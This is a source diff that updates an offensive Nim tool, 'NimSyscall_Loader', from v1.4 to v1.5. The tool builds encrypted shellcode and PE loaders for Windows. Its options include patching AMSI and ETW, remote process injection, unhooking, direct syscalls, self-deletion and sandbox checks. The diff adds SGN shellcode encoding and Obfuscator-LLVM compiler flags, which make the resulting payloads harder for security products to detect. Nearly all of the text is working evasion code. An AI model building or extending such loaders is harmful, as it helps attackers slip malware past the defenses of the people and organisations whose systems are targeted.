@@ -9,10 +9,10 @@ import nimcrypto/sysrand
 import base64
 import strformat
 import strutils
+import sugar
 import os
 import osproc
 import docopt
-import std/math
 import random
 
 import HellsgateStubs
@@ -28,9 +28,6 @@ func toByteSeq*(str: string): seq[byte] {.inline.} =
   ## Converts a string to the corresponding byte sequence.
   @(str.toOpenArrayByte(0, str.high))
 
-proc toString(bytes: seq[byte]): string =
-  result = newString(bytes.len)
-  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
 
 proc rndStr(length: int): string =
   for _ in 0.. length:
@@ -44,7 +41,7 @@ let banner = """
  / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
 /_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                        /____/                   /_____/      --> @ShitSecure
-                                                                 v1.4                                            
+                                                                 v1.5                                            
 
 """
 
@@ -53,10 +50,10 @@ echo banner
 #Handle arguments
 
 let helpmenu = """
-NimSyscall_Loader v 1.4
+NimSyscall_Loader v 1.5
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --syswhispers --jump --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --x86]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --x86 --llvm]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -89,6 +86,7 @@ Options:
   --hellsgate    Retrieve Syscalls via Hellsgate technique (for patching AMSI/ETW or shellcode execution/PE injection)
   --syswhispers    Embed Syscalls via Syswhispers3 (NimLineWhispers3) technique
   --jump    When using Syswhispers3, use the jumper_randomized technique
+  --sgn    Encode shellcode via SGN before encrypting it
   --replace    Replace common nim IoC's in the loader like the string 'nim'
   --sandbox value    Include Sandbox Checks of your choice into the loader:
                      Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
@@ -103,6 +101,7 @@ Options:
   --obfuscatefunctions    Obfuscate some Nim specific Windows API's from the IAT via CallObfuscator (https://github.com/d35ha/CallObfuscator - only possible from a Windows OS)
   --debug    Compiles the binary in debug mode (More DInvoke output)
   --x86    (Compiles an x86 binary - have to cast some more function values before this works smoothly)
+  --llvm    Add compiler flags for LLVM obfuscation, you have to set it up by yourself
 """
 
 if (paramCount() == 0):
@@ -134,6 +133,7 @@ var
     localinject: bool = true
     unhook: bool = false
     denim: bool = false
+    llvm: bool = false
     gosleep: bool = false
     sleeptime: int = 0
     reflective: bool = false
@@ -145,6 +145,7 @@ var
     hellsgate: bool = false
     syswhispers: bool = false
     jump: bool = false
+    sgn: bool = false
     getfreshstub: bool = true
     selfdelete: bool = false
     remoteAMSIpatch: bool = false
@@ -156,7 +157,7 @@ var
     debugMode: bool = false
     compileX86: bool = false
 
-let args = docopt(helpmenu, version = "NimSyscall_Loader 1.4")
+let args = docopt(helpmenu, version = "NimSyscall_Loader 1.5")
 
 if args["--file"]:
   let fname = args["--file"]
@@ -246,6 +247,9 @@ if args["--reflective"]:
 if args["--obfuscate"]:
   denim = true
 
+if args["--llvm"]:
+  llvm = true
+
 if args["--hide"]:
   hide = true
 
@@ -266,6 +270,9 @@ if args["--syswhispers"]:
 if args["--jump"]:
   syswhispers = true
   jump = true
+
+if args["--sgn"]:
+  sgn = true
 
 if args["--replace"]:
   replace = true
@@ -302,19 +309,38 @@ var blob: string
 #Read file and if PE convert to shellcode before
 if (peinject):
     when system.hostOS == "windows":
-        var exist: bool = fileExists("donut.exe")
+        var exist: bool = fileExists(fmt"{packerPath}\donut\donut.exe")
     else:
         var exist: bool = true
     if (exist):
         when system.hostOS == "windows":
-            discard os.execShellCmd(fmt"donut -f {filename} -b 1 -o tmpshellcode.bin")
+            discard os.execShellCmd(fmt"{packerPath}\donut\donut -b 1 -o tmpshellcode.bin --input:{filename}")
+            if (sgn):
+                if (compileX86):
+                    discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -c 3  -o tmpshellcode.bin tmpshellcode.bin")
+                else:
+                    discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -a 64 -c 3  -o tmpshellcode.bin tmpshellcode.bin")
+                sgn = false
         elif system.hostOS == "linux":
             discard os.execShellCmd(fmt"donut {filename} -b 1 -o tmpshellcode.bin")
+            if (sgn):
+                if (compileX86):
+                    discard os.execShellCmd(fmt"{packerPath}\sgn\sgn -c 3  -o tmpshellcode.bin tmpshellcode.bin")
+                else:
+                    discard os.execShellCmd(fmt"{packerPath}\sgn\sgn -a 64 -c 3  -o tmpshellcode.bin tmpshellcode.bin")
+                sgn = false
         blob = readFile("tmpshellcode.bin")
         shellcode = true
         peload = false
     else:
         echo fmt"'Donut' not found. You need to download/install according to the README"
+        quit()
+elif(sgn):
+    if (compileX86):
+        discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -c 3  -o tmpshellcode.bin {filename}")
+    else:
+        discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -a 64 -c 3  -o tmpshellcode.bin {filename}")
+    blob = readFile("tmpshellcode.bin")
 else:
     blob = readFile(filename)
 
@@ -361,6 +387,8 @@ from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
 
 let LoadAssemblyStub = """
 var assembly = load(dectext)
+
+from os import paramCount,paramStr
 
 when defined(lib_only):
     # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
@@ -421,9 +449,9 @@ import winim/lean
 #from dynlib import LibHandle, loadLib
 # something seams to be still missing here
 #from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR,LPDWORD,WINBOOL,TRUE,FALSE,HMODULE,LPOVERLAPPED, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, PROCESS_ALL_ACCESS, FALSE, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES
-import dynlib
+#from winim/lean import FARPROC,NtClose
+#from winim import winstr,winimbase,windef
 import strformat
-from os import paramCount, paramStr
 from nimcrypto import CTR, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
 import base64
 import strutils
@@ -667,6 +695,7 @@ var {rand2} = {rand1}
   return trustedwordsstub
 
 let DllStub = """
+import dynlib
 proc NimMain() {.cdecl, importc.}
 
 proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
@@ -689,6 +718,7 @@ proc FUNC_EXPORT(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BO
 """
 
 let DllStubRemoteInj = """
+import dynlib
 proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
     return true
 
@@ -989,7 +1019,30 @@ elif system.hostOS == "linux":
         echo "No Denim support for Linux systems, sorry!"
 
 
-when system.hostOS == "windows":
+if (llvm):
+    echo "[+] Using LLVM-Obfuscator to compile"
+    if system.hostOS == "linux":
+        # Stolen from https://github.com/icyguider/Nimcrypt2/blob/main/nimcrypt.nim#L710
+        var result = execCmdEx("x86_64-w64-mingw32-clang -v")
+        if "Obfuscator-LLVM" in result.output:
+            let ochars = {'A'..'Z','0'..'9'}
+            var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
+            #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
+            basicCompileFlags.add(fmt"nim c -d=release --hint:pattern:off --warning:all:off --cc:clang --opt:size --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}'")
+        else:
+            echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
+            quit()
+    when system.hostOS == "windows":
+        var result = execCmdEx("clang -v")
+        if "Obfuscator-LLVM" in result.output:
+            let ochars = {'A'..'Z','0'..'9'}
+            var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
+            #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
+            basicCompileFlags.add(fmt"nim c -d=release --hint:pattern:off --warning:all:off --cc:clang --opt:size --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}'")
+        else:
+            echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
+            quit()
+elif system.hostOS == "windows":
     basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size "
 elif system.hostOS == "linux":
     basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size "
